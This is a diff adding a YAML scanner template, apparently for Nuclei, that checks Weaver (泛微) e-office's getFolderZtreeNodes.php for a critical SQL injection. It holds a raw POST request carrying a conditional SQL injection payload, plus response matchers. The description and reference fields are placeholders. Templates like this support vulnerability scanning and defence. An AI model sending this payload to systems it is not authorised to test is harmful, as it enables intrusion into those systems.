@@ -1,0 +1,30 @@
+id: eoffice_getFolderZtreeNodes_sqli
+info:
+  name: 泛微getFolderZtreeNodes 存在SQL注入漏洞
+  author: mhb17
+  severity: critical
+  description: description
+  reference:
+    - https://
+  tags: sqli
+http:
+  - raw:
+      - |-
+        POST /general/system/file_folder/purview_new/getFolderZtreeNodes.php HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.5414.120 Safari/537.36
+        Connection: close
+        Content-Type: application/x-www-form-urlencoded
+        Content-Length: 613
+
+        id=(SELECT (CASE WHEN (length(database())<0) THEN 1 ELSE (SELECT 9469 UNION SELECT 1668) END))&lv=0&n=&param=eyJmaWxlU29ydCI6bnVsbCwicm9vdCI6eyJuYW1lIjpudWxsLCJjaGVjayI6dHJ1ZSwidXJsIjoiL2dlbmVyYWwvZmlsZV9mb2xkZXIvZmlsZV9uZXcvZmlsZWxpc3QucGhwP1NPUlRfSUQ9MCZGSUxFX1NPUlQ9IiwidGFyZ2V0IjoiZmlsZV9tYWluIiwicmlnaHRDbGljayI6ZmFsc2V9LCJub2RlIjp7InJpZ2h0Q2xpY2siOmZhbHNlLCJ1cmwiOiIvZ2VuZXJhbC9maWxlX2ZvbGRlci9maWxlX25ldy9maWxlbGlzdC5waHAiLCJ0YXJnZXQiOiJmaWxlX21haW4iLCJsb2FkQWxsIjpmYWxzZX0sInNlbGVjdCI6eyJzb3J0aWQiOm51bGwsInNvcnRuYW1lIjpudWxsLCJnZXR3aGF0IjpudWxsLCJmaWxlc29ydCI6bnVsbCwiY2xpY2tGdW4iOiJzZWxlY3RfZm9sZGVyIn19
+    matchers-condition: and
+    matchers:
+      - type: word
+        part: body
+        words:
+          - folder.class.php
+      - type: word
+        part: header
+        words:
+          - '302'
